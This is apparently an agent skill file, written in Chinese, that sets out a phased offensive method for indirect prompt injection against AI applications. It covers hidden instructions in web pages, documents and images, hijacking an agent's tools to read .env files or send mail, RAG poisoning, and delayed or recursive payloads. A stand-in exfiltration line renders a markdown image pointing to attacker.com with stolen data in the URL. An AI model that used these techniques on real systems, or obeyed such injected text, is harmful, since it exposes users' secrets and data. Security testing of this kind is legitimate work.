---
name: prompt-injection
description: "AI/LLM 间接 Prompt 注入攻击。当目标 AI 系统会处理外部数据源（网页、文档、邮件、数据库、API 返回）时使用。覆盖间接注入、工具链劫持、RAG 投毒、数据外泄等技术。OWASP LLM Top 10 #1 漏洞类别"
metadata:
  tags: "ai,llm,prompt-injection,间接注入,RAG,投毒,工具调用,数据外泄,AI安全,Agent,插件"
  category: "ai-security"
---

# AI Prompt 间接注入execution-framework

## 概述

Prompt Injection（提示注入）是指攻击者通过 AI 系统处理的外部数据源，注入恶意指令来操控模型行为。与 jailbreak（用户直接输入）不同，injection 利用**不受信任的第三方数据**作为攻击载体，模型无法区分"数据"和"指令"。

这是 LLM 应用最危险的漏洞类别 — OWASP LLM Top 10 的 **#1** 位。

## 深入参考

- 各 Phase 详细 Payload 与代码（网页/文档/CSV/图片/工具链/RAG/数据外泄/高级技术） → [references/injection-payloads.md](references/injection-payloads.md)

---

## 攻击面分类

| 注入渠道 | 载体 | 危害等级 |
|----------|------|----------|
| 网页内容 | AI 浏览/搜索时读取恶意页面 | Critical |
| 文档上传 | PDF/Word/CSV 中嵌入隐藏指令 | Critical |
| 邮件内容 | AI 邮件助手处理恶意邮件 | Critical |
| 数据库/RAG | knowledge-base中投毒的文档 | Critical |
| API 返回 | AI Agent 调用的 API 返回恶意内容 | High |
| 用户评论/表单 | AI 分析用户生成内容时触发 | High |
| 图片 OCR | 图片中包含隐藏文本指令 | High |
| 代码注释 | AI 代码助手读取恶意注释 | High |

---

## execution-framework概览

### Phase 1: 间接注入 — 网页/文档载体
- **网页隐藏指令**: CSS 隐藏元素/HTML 注释中嵌入 AI 可读指令
- **文档注入**: PDF/Word 白色字体隐藏指令、PDF 元数据注入
- **CSV/数据注入**: 在数据字段中嵌入恶意指令
- **图片注入（多模态）**: 极浅颜色文字（人看不见，AI 可读）

### Phase 2: 工具链劫持 (Tool Use Abuse)
- **工具调用注入**: 通过外部数据让 Agent 调用 read_file/http_request 等危险工具
- **跨工具链攻击**: 搜索工具返回恶意内容 → 触发邮件工具发送数据
- **文件系统 Agent 攻击**: 代码仓库 README 中注入 → AI 代码助手读取 .env

### Phase 3: RAG 投毒
- **knowledge-base投毒**: 在正常文档中夹带恶意指令（白色字体/特殊标记）
- **对抗性检索**: 构造高频关键词文本确保被检索命中
- **元数据层注入**: 在文档 metadata 中注入覆盖指令

### Phase 4: 数据外泄
- **Markdown 图片外泄**: 让 AI 输出包含 `![](https://attacker.com/log?data=...)` 的 markdown
- **链接外泄**: 伪装为"更多信息"链接，URL 参数携带敏感数据
- **隐蔽编码外泄**: 用首字母拼写等方式隐蔽泄露

### Phase 5: 高级注入技术
- **Payload Splitting**: 恶意指令分散到多个数据源，单独无害组合有害
- **延迟触发**: 嵌入条件触发器，特定查询时激活
- **递归注入**: 让 AI 输出中嵌入新的注入 payload，链式传播

> 所有技术的详细 payload 和代码见 [references/injection-payloads.md](references/injection-payloads.md)

---

## 实战检测清单

```
1. [ ] 目标 AI 应用是否处理外部数据？（网页、文档、邮件、API）
2. [ ] 是否有工具调用/插件能力？（文件操作、网络请求、代码执行）
3. [ ] 是否使用 RAG/knowledge-base？（可投毒的向量数据库）
4. [ ] 输出是否渲染 Markdown？（图片/链接外泄风险）
5. [ ] 是否有多步骤工作流？（跨步骤注入机会）
6. [ ] 数据输入是否经过消毒？（HTML 标签、元数据是否保留）
7. [ ] 是否区分数据和指令？（系统/用户/上下文分离）
```

---

## 参考资源

- [OWASP LLM Top 10 — LLM01: Prompt Injection](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [Not what you've signed up for: Compromising Real-World LLM-Integrated Applications](https://arxiv.org/abs/2302.12173)
- [Indirect Prompt Injection via YouTube Transcripts](https://kai-greshake.de/)
- [Prompt Injection in LangChain Agents](https://blog.langchain.dev/security/)
- [Markdown Image Exfiltration in ChatGPT Plugins](https://embracethered.com/blog/posts/2023/chatgpt-plugin-data-exfiltration/)
- [Google Bard Indirect Injection via Google Docs](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)

